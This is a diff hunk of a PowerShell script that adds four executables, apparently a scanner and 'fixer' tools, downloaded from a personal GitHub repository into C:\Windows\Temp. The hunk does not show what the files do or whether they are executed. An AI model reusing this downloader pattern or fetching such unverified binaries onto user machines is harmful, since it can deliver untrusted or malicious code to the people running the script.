@@ -29,10 +29,10 @@ Write-Host "${bg}${white}${pad}${reset}"
 $script:bottomY = $Host.UI.RawUI.CursorPosition.Y
 
 $downloads = @(
-    @{ URL = '' },
-    @{ URL = '' },
-    @{ URL = '' },
-    @{ URL = '' }
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/MajesticFixer.exe'; Path = 'C:\Windows\Temp\MajesticFixer.exe' },
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
 )
 
 function Show-Progress {
